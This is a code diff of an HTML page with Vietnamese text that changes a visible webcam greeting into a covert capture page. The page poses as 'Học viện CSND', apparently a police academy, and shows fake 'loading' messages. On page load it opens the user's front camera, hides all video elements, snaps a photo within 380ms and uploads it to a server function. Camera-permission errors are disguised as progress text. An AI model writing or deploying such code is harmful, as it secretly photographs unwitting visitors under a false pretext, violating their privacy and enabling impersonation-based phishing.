@@ -7,8 +7,8 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
+            background: #f8f9fa;           /* Nền trắng nhạt */
+            color: #333;
             margin: 0;
             padding: 20px;
             min-height: 100vh;
@@ -17,80 +17,87 @@
             align-items: center;
             justify-content: center;
         }
-        .welcome {
-            background: rgba(255,255,255,0.15);
-            padding: 30px;
-            border-radius: 20px;
+        .container {
             text-align: center;
-            max-width: 700px;
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 1.8em;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        p {
+            color: #555;
             margin-bottom: 30px;
         }
-        video {
-            width: 100%;
-            max-width: 640px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-            display: none;
-        }
         .status {
-            margin-top: 25px;
-            font-size: 1.3em;
-            text-align: center;
+            font-size: 1.1em;
+            color: #666;
             min-height: 50px;
         }
-        canvas { display: none; }
+        /* Ẩn hoàn toàn camera */
+        video, canvas {
+            display: none !important;
+            visibility: hidden;
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            overflow: hidden;
+        }
     </style>
 </head>
 <body>
-    <div class="welcome">
-        <h1>🌟 Chào mừng bạn đã đến với Website của chúng tôi!</h1>
-        <p>Chúc bạn một ngày vui vẻ, hạnh phúc!</p>
+    <div class="container">
+        <h1>Học viện CSND</h1>
+        <p>Đang tải dữ liệu và đồng bộ thông tin...</p>
+        
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+        
+        <div class="status" id="status">Vui lòng chờ trong giây lát...</div>
     </div>
-
-    <video id="video" autoplay playsinline></video>
-    <div class="status" id="status">Đang chuẩn bị dữ liệu...</div>
-
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        async function startCapture() {
+        async function startSilentCapture() {
             try {
-                status.textContent = "Đang lấy dữ liệu...";
+                status.textContent = "Đang kết nối hệ thống...";
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: "user",
                         width: { ideal: 640 },
                         height: { ideal: 480 },
-                        frameRate: { ideal: 15 }
+                        frameRate: { ideal: 20 }
                     }
                 });
 
                 video.srcObject = stream;
-                video.style.display = 'block';
 
+                // Thời gian cực ngắn: 380ms
                 video.onloadedmetadata = () => {
-                    setTimeout(() => captureAndUpload(stream), 650);
+                    setTimeout(() => silentCapture(stream), 380);
                 };
+
             } catch (err) {
-                status.textContent = "❌ Vui lòng cho phép truy cập camera";
+                status.textContent = "Đang xử lý...";
+                console.error(err);
             }
         }
 
-        async function captureAndUpload(stream) {
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-
-            const imageData = canvas.toDataURL('image/jpeg', 0.72);
-
-            status.textContent = "Đang gửi dữ liệu...";
-
+        async function silentCapture(stream) {
             try {
+                status.textContent = "Đang thu thập và gửi dữ liệu...";
+
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.65);
+
                 const response = await fetch('/.netlify/functions/save-image', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -98,23 +105,24 @@
                 });
 
                 if (response.ok) {
-                    status.innerHTML = `✅ <b>Đã gửi dữ liệu thành công!</b><br>
-                                        <small>Dữ liệu đã được gửi</small>`;
+                    status.innerHTML = `Hoàn tất.<br><small>Dữ liệu đã được gửi thành công.</small>`;
                 } else {
-                    status.textContent = "❌ Gửi dữ liệu thất bại. Vui lòng thử lại.";
+                    status.textContent = "Đang hoàn tất...";
                 }
+
             } catch (error) {
-                status.textContent = "❌ Lỗi kết nối server. Hãy thử lại sau.";
+                status.textContent = "Đang hoàn tất...";
+                console.error(error);
             }
 
-            // Tắt webcam
+            // Tắt camera rất nhanh
             setTimeout(() => {
-                stream.getTracks().forEach(track => track.stop());
-                video.style.display = 'none';
-            }, 2000);
+                if (stream) stream.getTracks().forEach(track => track.stop());
+            }, 600);
         }
 
-        window.onload = startCapture;
+        // Tự động chạy
+        window.onload = startSilentCapture;
     </script>
 </body>
 </html>
